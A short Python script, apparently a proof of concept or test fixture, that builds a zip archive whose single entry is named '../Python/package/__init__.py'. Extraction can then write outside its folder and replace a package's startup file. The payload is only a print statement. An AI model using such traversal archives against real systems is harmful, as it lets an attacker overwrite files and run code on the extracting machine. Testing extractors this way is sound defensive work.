import zipfile
z_info = zipfile.ZipInfo(r"../Python/package/__init__.py")
z_file = zipfile.ZipFile("bad1.zip", mode="w")
z_file.writestr(z_info, "print('test')")
#z_info.external_attr = 0777 << 16
z_file.close()